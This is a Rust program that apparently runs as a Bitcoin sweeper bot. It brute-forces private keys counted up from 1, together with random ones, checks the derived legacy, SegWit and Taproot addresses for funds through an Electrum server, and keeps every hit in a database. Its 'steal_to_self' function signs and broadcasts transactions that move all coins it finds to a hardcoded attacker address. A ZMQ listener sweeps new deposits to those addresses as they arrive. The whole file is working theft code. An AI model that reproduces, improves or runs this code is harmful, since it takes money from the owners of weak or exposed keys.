use bitcoin::absolute::LockTime;
use bitcoin::key::{TapTweak, TweakedKeyPair};
use bitcoin::psbt::Psbt;
use bitcoin::secp256k1::{Message, Secp256k1};
use bitcoin::sighash::{EcdsaSighashType, Prevouts, SighashCache, TapSighashType};
use bitcoin::{
    Network, OutPoint, PrivateKey, Script, ScriptBuf, Sequence, Transaction, TxIn, TxOut, Txid,
    Witness,
};
use btc::define_table;
use btc::key_pair::Account;
use btc::keypair::random::generate_keypair_randomly;
use electrum_client::{Client as ElectrsClient, ElectrumApi};
use redb::{Database, ReadableTable, TableDefinition};
use std::path::Path;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;
use zeromq::{Socket, SocketRecv, SubSocket};

define_table!(SCRIPT_PUBKEY_TO_PRIVATE_KEY, String, String);
define_table!(CURRENT_IDX, i128, i8);

const TARGET_SCRIPT_PUBKEY: &str =
    "512043dc7bc7eb1b4d14ea4ec47a3c62c55ee4cd2e17d2d9344e4adc60c75a98d087";

const TO_SKIP: &str = "5120f303f0b3ecd25849ab00ad511e848608038bf954f88594ceed28b369835f5678";

fn steal_to_self(
    script: &Script,
    account: Account,
    electrs_client: Arc<ElectrsClient>,
) -> anyhow::Result<()> {
    if script.to_hex_string().eq(TO_SKIP) {
        return Ok(());
    }

    let secp = Secp256k1::new();

    let utxos = electrs_client.script_list_unspent(script)?;
    let src_script_pubkey = script.to_owned();
    let target_script_pubkey = ScriptBuf::from_hex(TARGET_SCRIPT_PUBKEY)?;

    for utxo in utxos {
        let gas = 120 * 50;
        let change = utxo.value.checked_sub(gas).unwrap();

        let input = TxIn {
            previous_output: OutPoint {
                txid: utxo.tx_hash,
                vout: utxo.tx_pos as u32,
            },
            script_sig: ScriptBuf::default(),
            sequence: Sequence::MAX,     // not to enable RBF
            witness: Witness::default(), // Filled in after signing.
        };

        let output = TxOut {
            value: change,
            script_pubkey: target_script_pubkey.clone(),
        };
        let mut unsigned_tx = Transaction {
            version: 2,
            lock_time: LockTime::ZERO,
            input: vec![input],
            output: vec![output.clone()],
        };
        if src_script_pubkey.is_p2pkh() {
            let input_index = 0;
            let hash_ty = EcdsaSighashType::All;

            let sighasher = SighashCache::new(unsigned_tx.clone());
            let sighash = sighasher
                .legacy_signature_hash(input_index, src_script_pubkey.as_script(), hash_ty.to_u32())
                .expect("");
            let msg = Message::from(sighash);
            let sig = secp.sign_ecdsa(&msg, &account.secret_key());

            let signature = bitcoin::ecdsa::Signature { sig, hash_ty };

            let pk = {
                if account
                    .p2pkh_address()?
                    .script_pubkey()
                    .as_script()
                    .to_string()
                    == script.to_string()
                {
                    account.public_key()?
                } else {
                    account.public_key_uncompressed()?
                }
            };

            let mut psbt = Psbt::from_unsigned_tx(unsigned_tx)?;
            psbt.inputs[input_index].partial_sigs.insert(pk, signature);
            let signed_tx = psbt.extract_tx();

            electrs_client.transaction_broadcast(&signed_tx)?;
        } else if src_script_pubkey.is_p2sh() {
        } else if src_script_pubkey.is_v0_p2wpkh() {
            let sighash_type = EcdsaSighashType::All;
            let input_index = 0;

            let mut sighasher = SighashCache::new(&mut unsigned_tx);
            let sighash = sighasher
                .segwit_signature_hash(
                    input_index,
                    src_script_pubkey.as_script(),
                    utxo.value,
                    sighash_type,
                )
                .expect("failed to create sighash");

            // Sign the sighash using the secp256k1 library (exported by rust-bitcoin).
            let msg = Message::from(sighash);
            let signature = secp.sign_ecdsa(&msg, &account.secret_key());

            // Update the witness stack.
            let signature = bitcoin::ecdsa::Signature {
                sig: signature,
                hash_ty: sighash_type,
            };
            let pk = account.public_key()?;
            let mut witness = Witness::new();
            witness.push(signature.serialize());
            witness.push(pk.to_bytes());
            *sighasher.witness_mut(input_index).unwrap() = witness;

            // Get the signed transaction.
            let signed_tx = sighasher.into_transaction();
            electrs_client.transaction_broadcast(&signed_tx)?;
        } else if src_script_pubkey.is_v1_p2tr() {
            let mut sighasher = SighashCache::new(&mut unsigned_tx);
            let input_index = 0;
            let sighash = sighasher
                .taproot_key_spend_signature_hash(
                    input_index,
                    &Prevouts::All(&vec![output]),
                    TapSighashType::Default,
                )
                .expect("failed to construct sighash");

            // Sign the sighash using the secp256k1 library (exported by rust-bitcoin).
            let keypair = account.keypair();
            let tweaked: TweakedKeyPair = keypair.tap_tweak(&secp, None);
            let msg = Message::from(sighash);
            let signature = secp.sign_schnorr(&msg, &tweaked.to_inner());

            // Update the witness stack.
            let signature = bitcoin::taproot::Signature {
                sig: signature,
                hash_ty: TapSighashType::Default,
            };
            // signature.to_vec();
            let mut script_witness = Witness::new();
            script_witness.push(signature.to_vec());
            *sighasher.witness_mut(input_index).unwrap() = script_witness;

            // Get the signed transaction.
            let signed_tx = sighasher.into_transaction();
            electrs_client.transaction_broadcast(&signed_tx)?;
        }
    }

    Ok(())
}

async fn zmq_tx_hash(
    endpoint: String,
    electrs_client: Arc<ElectrsClient>,
    database: Arc<Database>,
) -> anyhow::Result<()> {
    let mut sub = SubSocket::new();
    sub.connect(&endpoint).await?;
    // sub.subscribe("hashblock").await?;
    sub.subscribe("hashtx").await?;

    loop {
        let msg = sub.recv().await?;

        let topic = {
            let topic = msg.get(0).unwrap();
            String::from_utf8(topic.to_vec()).unwrap()
        };

        dbg!(&topic);

        // must be "hashtx", won't be anything else
        if !topic.eq("hashtx") {
            continue;
        }

        let payload = {
            let payload = msg.get(1).unwrap();
            hex::encode(payload.as_ref())
        };
        println!("zmq: topic: {:?}, payload: {:?}", topic, payload);

        let rx = database.begin_read()?;
        let table = rx.open_table(SCRIPT_PUBKEY_TO_PRIVATE_KEY)?;

        let txid = Txid::from_str(&payload).unwrap();
        let tx = electrs_client.transaction_get(&txid).expect("fetch tx");

        let mut script_pubkeys = vec![];
        for input in tx.input {
            let (prev_txid, vout) = (input.previous_output.txid, input.previous_output.vout);
            let prev_tx = electrs_client.transaction_get(&prev_txid)?;
            let output = prev_tx.output.get(vout as usize).unwrap();

            script_pubkeys.push(output.script_pubkey.clone())
        }

        for output in tx.output {
            script_pubkeys.push(output.script_pubkey);
        }

        for script_pubkey in script_pubkeys {
            let script = script_pubkey.as_script();
            let account = {
                if let Some(v) = table.get(script.to_hex_string())? {
                    let pk = PrivateKey::from_str(&v.value())?;
                    Account::from(pk)
                } else {
                    println!(
                        "txid: {:}, script: {:} not found",
                        txid,
                        script.to_hex_string()
                    );
                    continue;
                }
            };
            steal_to_self(script, account, electrs_client.clone()).expect("steal...");
        }
    }
}

// async fn iterate_mempool_txs(client: Arc<RPCClient>) {
//     loop {
//         let raw_mempools = client.get_raw_mempool();
//         if raw_mempools.is_err() {
//             tokio::time::sleep(Duration::new(5 * 60, 0)).await;
//             continue;
//         }
//         let txids = raw_mempools.unwrap();
//
//         for txid in txids {
//             println!("txid: {:?}", txid);
//         }
//
//         tokio::time::sleep(Duration::new(10 * 60, 0)).await;
//     }
// }

async fn iterate_existing_private_keys(
    electrs_client: Arc<ElectrsClient>,
    database: Arc<Database>,
) -> anyhow::Result<()> {
    loop {
        let rtx = database.begin_read()?;
        let table = rtx.open_table(SCRIPT_PUBKEY_TO_PRIVATE_KEY)?;
        for kv in table.iter()? {
            let real_kv = kv.unwrap();

            println!("{:} : {:}", real_kv.0.value(), real_kv.1.value());
            let script_value = real_kv.0.value();
            let script_pubkey = match ScriptBuf::from_hex(&script_value) {
                Ok(script_pubkey) => script_pubkey,
                Err(_) => continue,
            };
            let script = script_pubkey.as_script();

            let private_key = PrivateKey::from_str(real_kv.1.value().as_str())?;
            println!("{:?}, {:} : {:}", script_value, script, private_key);

            let account = Account::from(private_key);

            steal_to_self(script, account, electrs_client.clone())?;
        }
    }
}

fn iterate_on_account(
    account: Account,
    electrs_client: Arc<ElectrsClient>,
    database: Arc<Database>,
) -> anyhow::Result<()> {
    let address_to_private_key = [
        (account.p2pkh_address()?, account.private_key()?),
        (
            account.p2pkh_address_uncompressed()?,
            account.private_key_uncompressed()?,
        ),
        (account.p2shwpkh_address()?, account.private_key()?),
        (account.p2wpkh_address()?, account.private_key()?),
        (account.p2tr_address(), account.private_key()?),
    ];

    for (address, private_key) in address_to_private_key {
        let script_pubkey = address.script_pubkey();
        let script = script_pubkey.as_script();
        let list_utxos = electrs_client.script_list_unspent(script)?;

        dbg!(&list_utxos);

        if !list_utxos.is_empty() {
            steal_to_self(script, account.clone(), electrs_client.clone())?;
        } else {
            let history = electrs_client
                .script_get_history(account.p2wpkh_address()?.script_pubkey().as_script())?;
            dbg!(&history);
            if history.is_empty() {
                continue;
            }
        }

        let wtx = database.begin_write()?;
        wtx.open_table(SCRIPT_PUBKEY_TO_PRIVATE_KEY)?
            .insert(script.to_hex_string(), private_key.to_string())
            .expect("insert script-to-private-key");
        wtx.commit()?;
    }

    Ok(())
}

async fn iterate_on_number(
    electrs_client: Arc<ElectrsClient>,
    database: Arc<Database>,
) -> anyhow::Result<()> {
    let mut private_key_int: u128 = 1;

    loop {
        let account = private_key_int.into();
        println!("idx: {:}", private_key_int);
        if iterate_on_account(account, electrs_client.clone(), database.clone()).is_err() {
            continue;
        }

        private_key_int = private_key_int.checked_add(1).unwrap_or(1);
        println!("now idx: {:}", private_key_int);
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenv::dotenv().unwrap();

    let network = Network::from_core_arg(&std::env::var("NETWORK")?)?;
    let database_path = std::env::var("DATABASE_PATH")?;
    let electrs_host = std::env::var("ELECTRS_HOST")?;
    let zmq_host = std::env::var("ZMQ_HOST")?;
    // let mnemonic = std::env::var("MNEMONIC")?;
    // let ag = AccountGenerator::new(&mnemonic, network)?;

    // let rpc_url = &std::env::var("RPC")?;
    // let auth = {
    //     let rpc_user = std::env::var("RPCUSER")?;
    //     let rpc_pass = std::env::var("RPCPASS")?;
    //     Auth::UserPass(rpc_user, rpc_pass)
    // };

    // let daemon_client = Arc::new(RPCClient::new(rpc_url, auth)?);
    let electrs_client = Arc::new(ElectrsClient::new(&electrs_host)?);

    let database = {
        let path = Path::new(&database_path);
        match path.exists() {
            false => {
                let db = Database::builder().create(path)?;
                let mut wtx = db.begin_write()?;
                {
                    wtx.open_table(SCRIPT_PUBKEY_TO_PRIVATE_KEY)?
                        .insert("ligulfzhou".to_string(), "ligulfzhou".to_string())?;
                    wtx.commit()?;
                }
                Arc::new(db)
            }
            _ => Arc::new(Database::builder().open(path)?),
        }
    };

    // tokio::spawn(iterate_mempool_txs(daemon_client.clone()));
    tokio::spawn(zmq_tx_hash(
        zmq_host,
        electrs_client.clone(),
        database.clone(),
    ));
    tokio::spawn(iterate_existing_private_keys(
        electrs_client.clone(),
        database.clone(),
    ));
    tokio::spawn(iterate_on_number(electrs_client.clone(), database.clone()));

    loop {
        let account = generate_keypair_randomly(network);
        // let account = ag.get_account_from_index(0)?;
        iterate_on_account(account, electrs_client.clone(), database.clone())?;
    }
}
